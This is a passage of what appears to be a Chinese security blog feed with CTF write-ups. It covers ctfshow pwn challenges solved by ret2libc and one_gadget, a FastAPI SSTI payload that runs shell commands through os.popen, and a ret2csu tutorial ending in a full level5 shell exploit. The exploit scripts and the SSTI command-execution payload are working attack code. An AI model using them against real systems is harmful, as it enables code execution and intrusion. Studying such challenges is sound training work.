        <content type="html"><![CDATA[<p>1024嘛,周末抽空看了下ctfshow1024杯,题总体简单就是参赛晚了。没什么时间打了。</p><a id="more"></a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1024-happy-stack"><a href="#1024-happy-stack" class="headerlink" title="1024_happy_stack"></a>1024_happy_stack</h3><p><img src="image-20201027162241325.png" alt="image-20201027162241325"></p><p>分析题目发现是一个栈溢出,但是要绕一个ctfshow函数.</p><p><img src="image-20201027141150383.png" alt="image-20201027141150383"></p><p>观测发现我们可以用’\00’来截断strcmp的检查.</p><p><img src="image-20201027162743178.png" alt="image-20201027162743178"></p><p>在植入shell时,直接用gadget的方法(学习后发现真的好用)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#from one_gadget import generate_one_gadget</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('111.231.70.44', 28097)</span></span><br><span class="line">p=process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx,rbp,r12,r13,r14,r15)</span>:</span></span><br><span class="line">pay=<span class="string">'36D\00\00'</span>+<span class="string">'a'</span>*(<span class="number">0x380</span><span class="number">-5</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x00000000004007F6</span>)+p64(<span class="number">0</span>)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(<span class="number">0x00004007E0</span>)+<span class="string">'\00'</span>*<span class="number">48</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'puts'</span>],e.got[<span class="string">'puts'</span>],<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'36D\n'</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">real_puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(real_puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, (real_puts))</span><br><span class="line">libcbase =(real_puts) - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b puts')</span></span><br><span class="line">print(hex(libcbase))</span><br><span class="line">one_gadget=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'36D'</span>+<span class="string">'\x00'</span>+<span class="string">'\x00'</span>*<span class="number">0x384</span></span><br><span class="line">payload+=p64(one_gadget)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1024-happy-checkin"><a href="#1024-happy-checkin" class="headerlink" title="1024_happy_checkin"></a>1024_happy_checkin</h3><p>这道感觉上一道简单直接one_gadget一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#from one_gadget import generate_one_gadget</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('111.231.70.44', 28075)</span></span><br><span class="line">p=process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line">print(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=csu(0,1,e.got['puts'],e.got['puts'],0,0)</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x370</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006e3</span>)+p64(e.got[<span class="string">'puts'</span>])+p64(e.plt[<span class="string">'puts'</span>])+p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real_puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(real_puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, (real_puts))</span><br><span class="line">libcbase =(real_puts) - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b puts')</span></span><br><span class="line">print(hex(libcbase))</span><br><span class="line">one_gadget=libcbase+<span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'a'</span>*<span class="number">0x370</span>+p64(<span class="number">0</span>)+p64(one_gadget)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h3><p>这道题有的意识表面考fastapi，实际就考了fastapi特性，更多的还是ssti。</p><p><img src="image-20201027164759063.png" alt="image-20201027164759063"></p><p>进入/docs发现cccalccc存在ssti。故慢慢试探。</p><p><img src="image-20201027165432130.png" alt="image-20201027165432130"></p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">r= requests.session()</span><br><span class="line">url = <span class="string">'http://1dadb4d7-6c85-4cbc-89df-92d370159f5b.chall.ctf.show/cccalccc'</span></span><br><span class="line">headers = &#123;<span class="string">'cookie'</span>:<span class="string">'UM_distinctid=1749ef3c1b2a-0ccbaee915c9eb8-4c312c7c-e1000-1749ef3c1bc46'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.get(url).text</span></span><br><span class="line">x=r.post(url,&#123;<span class="string">'q'</span>:<span class="string">'str(().__class__.__base__.__subclasses__()[95].__init__.__globals__["__builtins__"]["__imp"+"ort__"]("os").__dict__["p"+"o"+"pen"]("cat /mnt/f1a9 ").read())'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> (x.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn小记(3)</title>
      <link href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/"/>
      <url>/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/</url>
      
        <content type="html"><![CDATA[<p>最近,跟着ctf-wiki的进度,在研究64位下ret2csu,发现对之前的Ret2Libc在64位中的用法及64位的函数有些误解导致ret2csu卡了好久.故写文以记之.</p><a id="more"></a><h3 id="64位函数参数传递方式"><a href="#64位函数参数传递方式" class="headerlink" title="64位函数参数传递方式"></a>64位函数参数传递方式</h3><h4 id="Linux-x64"><a href="#Linux-x64" class="headerlink" title="Linux x64"></a>Linux x64</h4><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">call H</span><br></pre></td></tr></table></figure><p>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中(即和32位汇编一样)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br></pre></td></tr></table></figure><h4 id="Win-64"><a href="#Win-64" class="headerlink" title="Win 64"></a>Win 64</h4><p>与linux不同,win64中前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中这4个用于存放参数的寄存器分别是：存放整数参数的RCX，RDX，R8，R9；存放浮点数参数的XMM0，XMM1，XMM2，XMM3。</p><h3 id="Linux-x64-ret2bilc"><a href="#Linux-x64-ret2bilc" class="headerlink" title="Linux x64 ret2bilc"></a>Linux x64 ret2bilc</h3><p> 文件地址:<a href="https://ctf.show/files/09e5e2ba25e8a2f92cfc989e422986e8/pwn?token=eyJ1c2VyX2lkIjo2MzUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjkyfQ.X4QfkQ.e-Di0pNDhoeRLXJkQc8otm-2bD8" target="_blank" rel="noopener">64pwn</a></p><p>在做ctfshow pwn题时,发现有一道题用ret2text本地打得通远程打不通.故想用ret2bilc1的方法来获得shell.然后就踩了一个关于x64函数调用的坑。在Linux x64中，函数会先调用寄存器里面的，然后再调用栈里。（之前一直当成x32那样，把参数直接写在栈上所以失败了）</p><p>通过<code>ROPgadget --binary 64pwn --only &#39;pop|ret&#39;</code>：</p><p><img src="image-20201012174336320.png" alt="image-20201012174336320"></p><p>发现有直接操控第一个参数（rdi）的gadget。</p><p>通过<code>ROPgadget --binary 64pwn --string &#39;/bin/sh&#39;</code>：</p><p><img src="image-20201012175025107.png" alt="image-20201012175025107"></p><p>找到<code>/bin/sh</code>的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./64pwn'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./64pwn'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b main'</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"a"</span> *<span class="number">12</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0000400643</span>)+p64(<span class="number">0x0000000000400664</span>)+p64(e.plt[<span class="string">'system'</span>])+p64(e.plt[<span class="string">'system'</span>])</span><br><span class="line">print(len(<span class="string">"a"</span> *<span class="number">12</span>+p64(<span class="number">0</span>)+ p64(e.symbols[<span class="string">'getFlag'</span>])))</span><br><span class="line">print(hex(e.symbols[<span class="string">'getFlag'</span>]))</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Linux-x64-ret2csu"><a href="#Linux-x64-ret2csu" class="headerlink" title="Linux x64 ret2csu"></a>Linux x64 ret2csu</h3><p>由上面的题可以看见，我们不是每次都能同时控制 rdi, rsi, rdx, rcx, r8, r9这些传递参数的寄存器。因此我们可以,一些默认编译的函数中的 gadgets,来间接达到控制 rdi, rsi, rdx, rcx, r8, r9寄存器.</p><p>在一般的x64位程序，经常会编译以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><p>我们可以在这些函数里，去找有没有我们可以利用的gadgets。</p><p>以<code>__libc_csu_init</code>函数为例，<code>__libc_csu_init</code>的汇编代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E0</span><br><span class="line">.text:00000000004005E0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005E0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005E0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005E0                 push    r15</span><br><span class="line">.text:00000000004005E2                 push    r14</span><br><span class="line">.text:00000000004005E4                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E7                 push    r13</span><br><span class="line">.text:00000000004005E9                 push    r12</span><br><span class="line">.text:00000000004005EB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005F2                 push    rbp</span><br><span class="line">.text:00000000004005F3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005FA                 push    rbx</span><br><span class="line">.text:00000000004005FB                 mov     r13d, edi</span><br><span class="line">.text:00000000004005FE                 mov     r14, rsi</span><br><span class="line">.text:0000000000400601                 sub     rbp, r12</span><br><span class="line">.text:0000000000400604                 sub     rsp, 8</span><br><span class="line">.text:0000000000400608                 sar     rbp, 3</span><br><span class="line">.text:000000000040060C                 call    _init_proc</span><br><span class="line">.text:0000000000400611                 test    rbp, rbp</span><br><span class="line">.text:0000000000400614                 jz      short loc_400636</span><br><span class="line">.text:0000000000400616                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400618                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400620</span><br><span class="line">.text:0000000000400620 loc_400620:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400620                 mov     rdx, r15</span><br><span class="line">.text:0000000000400623                 mov     rsi, r14</span><br><span class="line">.text:0000000000400626                 mov     edi, r13d</span><br><span class="line">.text:0000000000400629                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040062D                 add     rbx, 1</span><br><span class="line">.text:0000000000400631                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400634                 jnz     short loc_400620</span><br><span class="line">.text:0000000000400636</span><br><span class="line">.text:0000000000400636 loc_400636:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400636                 add     rsp, 8</span><br><span class="line">.text:000000000040063A                 pop     rbx</span><br><span class="line">.text:000000000040063B                 pop     rbp</span><br><span class="line">.text:000000000040063C                 pop     r12</span><br><span class="line">.text:000000000040063E                 pop     r13</span><br><span class="line">.text:0000000000400640                 pop     r14</span><br><span class="line">.text:0000000000400642                 pop     r15</span><br><span class="line">.text:0000000000400644                 retn</span><br><span class="line">.text:0000000000400644 ; &#125; &#x2F;&#x2F; starts at 4005E0</span><br><span class="line">.text:0000000000400644 __libc_csu_init endp</span><br><span class="line">.text:0000000000400644</span><br></pre></td></tr></table></figure><p>我们仔细观察可以发现在0x000000000040063A到0x0000000000400644的gadget可以让我们控制到rbx、rbp、r12、r13、r14、r15.而0x0000000000400620到0x0000000000400629的gadget我们可以让我们通过rbx、rbp、r12、r13、r14、r15寄存器可以让我们间接控制rdx、rsi、edi甚至在rbx、rbp合理的情况（rbx值为0，rbp为1）下可以让我们call一个函数。</p><h4 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h4><p>以leve5为例来说，我们可以通过之前说的<code>__libc_csu_init</code>中的那两个gadget来控制一个来函数。先查看leve5属性.</p><p><img src="image-20201014161839287.png" alt="image-20201014161839287"></p><p>查看文件,发现没有命令执行函数与<code>/bin/sh</code>,要通过write出实际地址，计算偏移找libc。</p><p>同时，write要3个参数：write (int fd, const void * buf, size_t count)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |        1          | rdi存放第一参数，标准输出文件描述符：fd &#x3D; 1</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |     write_got     | rsi存放第二参数，需要输出的内存地址：*buf &#x3D; write_got</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |        8          | rdx存放第三参数，输出字节数：count &#x3D; 8</span><br><span class="line">----------------------------------</span><br><span class="line">|    call    |     write_got     | call write_got调用write函数</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure><p>所以我们要rdi，rsi，rdx三个寄存器，因此我们可以用__libc_csu_init里的gadgets来控制rbx、rbp、r12、r13、r14、r15来间接控制 rdi, rsi, rdx。 <img src="image-20201014223603871.png" alt="image-20201014223603871"></p><p>同样的方式来调用read将shell写入，及调用写入的shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x601028</span>  <span class="comment">#e.bss()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbx rbp r12 r13 r14 r15 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell)</span>:</span></span><br><span class="line">pay=<span class="string">'a'</span>*buf+p64(<span class="number">0</span>)</span><br><span class="line">    pay=pay+p64(g1)+p64(<span class="number">0</span>)</span><br><span class="line">pay=pay+p64(rbx)+p64(rbp)</span><br><span class="line">pay=pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay=pay+p64(g2)</span><br><span class="line">pay=pay+<span class="string">'\00'</span>*<span class="number">0x38</span>+p64(lest_cell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'write'</span>],<span class="number">1</span>,e.got[<span class="string">'write'</span>],<span class="number">8</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#write打印实际的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=p.recvline()</span><br><span class="line">print(x+<span class="string">'this one'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_real=p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, u64(puts_real))</span><br><span class="line">libcbase =u64(puts_real) - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">binsh=<span class="string">"/bin/sh\n"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,e.got[<span class="string">'read'</span>],<span class="number">0</span>,bss_addr,<span class="number">16</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#read将sehll写入</span></span><br><span class="line">print(p.recvline()+<span class="string">'this two'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b main')</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">print(len(p64(system_addr)+<span class="string">"/bin/sh\0"</span>))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay=csu(<span class="number">0x0000000000400606</span>,<span class="number">0x0000000004005F0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">1</span>,bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,e.symbols[<span class="string">'main'</span>])<span class="comment">#调用shell</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">print(p.recvline()+<span class="string">'this three'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b main')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里要注意的是，第二个gadge后，会按正常执行顺序再次进入第一个gadge，这次栈顶提高了0x38，因此我们要加0x38字符填充。</p><p><img src="image-20201014200307178.png" alt="image-20201014200307178"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-VI/Chapter-64.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-VI/Chapter-64.html</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/pqc1nq" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/bin/pqc1nq</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</title>
      <link href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/"/>
